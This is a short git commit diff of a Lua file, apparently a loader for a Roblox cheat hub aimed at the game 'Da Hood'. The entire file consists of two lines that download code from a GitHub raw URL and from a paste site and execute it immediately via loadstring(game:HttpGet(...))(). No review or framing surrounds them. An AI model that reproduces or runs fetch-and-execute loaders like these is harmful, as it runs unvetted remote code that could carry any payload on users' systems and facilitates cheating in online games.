974425e9a9f381b5f59d273417cd3423f2bb66db
GetModuleHandleA <76507977+GetModuleHandleA@users.noreply.github.com>
2023-01-26 01:50:19 +0000

    Update loadstring.lua

--- loadstring.lua
+++ loadstring.lua
@@ -1,4 +1,2 @@
-loadstring(game:HttpGet("https://feed-the-wump.us/raw/buravename",true))()
-
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/GetModuleHandleA/delux-hub/main/dahood.lua",true))()
+loadstring(game:HttpGet("https://feed-the-wump.us/raw/buravename",true))()
